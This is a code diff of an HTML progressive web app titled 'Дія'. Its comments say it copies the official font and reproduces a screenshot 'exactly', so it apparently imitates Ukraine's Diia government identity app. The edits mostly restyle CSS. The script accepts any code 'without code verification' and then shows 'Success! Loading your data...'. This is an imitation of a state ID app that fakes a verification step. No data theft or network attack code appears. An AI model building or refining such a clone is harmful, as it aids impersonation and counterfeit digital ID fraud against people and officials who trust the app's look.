@@ -6,7 +6,7 @@
   <meta name="theme-color" content="#000000">
   <title>Дія</title>
 
-  <!-- Офіційний шрифт e-Ukraine (використовується в Дії) -->
+  <!-- Офіційний шрифт e-Ukraine (як в Дії) -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=e-Ukraine:wght@300;400;500;700&display=swap" rel="stylesheet">
@@ -14,73 +14,61 @@
   <!-- PWA manifest -->
   <link rel="manifest" href="/manifest.json">
 
-  <!-- Іконки -->
+  <!-- Іконки (завантаж їх у img/icons/) -->
   <link rel="icon" type="image/png" sizes="192x192" href="/img/icons/icon-192.png">
   <link rel="apple-touch-icon" sizes="192x192" href="/img/icons/icon-192.png">
 
   <style>
-    :root {
-      --primary: #0066ff;
-      --primary-dark: #0055cc;
-      --bg: #f8f9fa;
-      --card: #ffffff;
-      --text: #000000;
-      --text-secondary: #555555;
-      --shadow: 0 10px 40px rgba(0,0,0,0.12);
-    }
-
-    * {
+    body {
       margin: 0;
       padding: 0;
-      box-sizing: border-box;
-    }
-
-    body {
       font-family: 'e-Ukraine', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      background: var(--bg);
-      color: var(--text);
+      background: #ffffff;
+      color: #000000;
       min-height: 100vh;
-      line-height: 1.5;
+      line-height: 1.4;
       letter-spacing: -0.01em;
       overflow-x: hidden;
+      text-align: center;
     }
 
-    /* Екран інструкції (як на твоєму скріні) */
+    /* Екран інструкції — ТОЧНО як на скріншоті */
     #instruction {
       min-height: 100vh;
       display: flex;
       flex-direction: column;
       justify-content: center;
       align-items: center;
-      text-align: center;
-      padding: 30px 20px;
+      padding: 40px 20px;
     }
 
     #instruction h1 {
-      font-size: 4rem;
+      font-size: 4.2rem;          /* трохи більше звичайного тексту */
       font-weight: 700;
-      margin-bottom: 50px;
+      margin-bottom: 60px;        /* вище центру */
+      color: #000;
     }
 
     #instruction ol {
       list-style: none;
       padding: 0;
-      margin: 40px 0;
+      margin: 0;
       max-width: 600px;
     }
 
     #instruction li {
-      font-size: 1.7rem;
+      font-size: 1.75rem;         /* менший ніж заголовок */
       font-weight: 400;
-      margin: 24px 0;
-      text-align: left;
+      margin: 32px 0;
+      line-height: 1.45;
+      text-align: center;         /* по центру своєї лінії */
     }
 
     /* Екран після установки */
     #app {
       display: none;
       min-height: 100vh;
-      background: var(--bg);
+      background: #f8f9fa;
       flex-direction: column;
       justify-content: center;
       align-items: center;
@@ -90,88 +78,75 @@
     .logo {
       width: 160px;
       margin-bottom: 60px;
-      filter: drop-shadow(0 8px 20px rgba(0,0,0,0.15));
+      filter: drop-shadow(0 8px 20px rgba(0,0,0,0.12));
     }
 
     h1 {
       font-size: 3.8rem;
       font-weight: 700;
-      margin-bottom: 16px;
+      margin-bottom: 20px;
     }
 
     .subtitle {
       font-size: 1.7rem;
-      color: var(--text-secondary);
-      text-align: center;
+      color: #444;
       margin-bottom: 60px;
-      font-weight: 400;
+      text-align: center;
     }
 
     .card {
       width: 100%;
       max-width: 440px;
-      background: var(--card);
+      background: white;
       border-radius: 28px;
-      box-shadow: var(--shadow);
+      box-shadow: 0 10px 40px rgba(0,0,0,0.1);
       padding: 50px 40px;
-      margin-bottom: 40px;
     }
 
     input {
       width: 100%;
       padding: 22px;
-      font-size: 2rem;
+      font-size: 2.1rem;
       text-align: center;
       border: 2px solid #ddd;
       border-radius: 18px;
       margin-bottom: 30px;
-      font-family: 'e-Ukraine', sans-serif;
-      transition: border-color 0.3s, box-shadow 0.3s;
+      transition: border-color 0.3s;
     }
 
     input:focus {
       outline: none;
-      border-color: var(--primary);
-      box-shadow: 0 0 0 5px rgba(0,102,255,0.12);
+      border-color: #0066ff;
     }
 
     button {
       width: 100%;
-      padding: 20px;
-      font-size: 1.7rem;
+      padding: 22px;
+      font-size: 1.75rem;
       font-weight: 600;
-      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+      background: #0066ff;
       color: white;
       border: none;
       border-radius: 18px;
       cursor: pointer;
-      transition: transform 0.2s, box-shadow 0.2s;
+      transition: background 0.3s;
     }
 
     button:active {
-      transform: scale(0.98);
+      background: #0055cc;
     }
 
     #result {
       margin-top: 40px;
-      font-size: 1.5rem;
+      font-size: 1.6rem;
       text-align: center;
       min-height: 80px;
-      line-height: 1.6;
-    }
-
-    /* Адаптивність */
-    @media (max-width: 480px) {
-      h1 { font-size: 3rem; }
-      .subtitle { font-size: 1.4rem; }
-      input, button { font-size: 1.6rem; padding: 18px; }
-      .card { padding: 40px 25px; }
     }
   </style>
 </head>
 <body>
 
-  <!-- Екран інструкції (точно як на твоєму скріні) -->
+  <!-- Екран інструкції — ТОЧНО як на твоєму скріншоті -->
   <div id="instruction">
     <h1>Chrome</h1>
     <ol>
@@ -197,8 +172,7 @@
   <script>
     // Перевірка standalone-режиму
     function checkStandalone() {
-      if (window.matchMedia('(display-mode: standalone)').matches || 
-          window.navigator.standalone === true) {
+      if (window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone === true) {
         document.getElementById('instruction').style.display = 'none';
         document.getElementById('app').style.display = 'flex';
         document.getElementById('codeInput').focus();
@@ -206,7 +180,7 @@
     }
     checkStandalone();
 
-    // Пропуск (без перевірки коду)
+    // Просто пропускає (без перевірки коду)
     function skipToNext() {
       const result = document.getElementById('result');
       result.innerHTML = 'Перевірка...';
@@ -215,7 +189,6 @@
       setTimeout(() => {
         result.innerHTML = 'Успіх!<br>Завантажуємо ваші дані...';
         result.style.color = '#34c759';
-        // Тут пізніше додамо PIN, картки тощо
       }, 1500);
     }
 
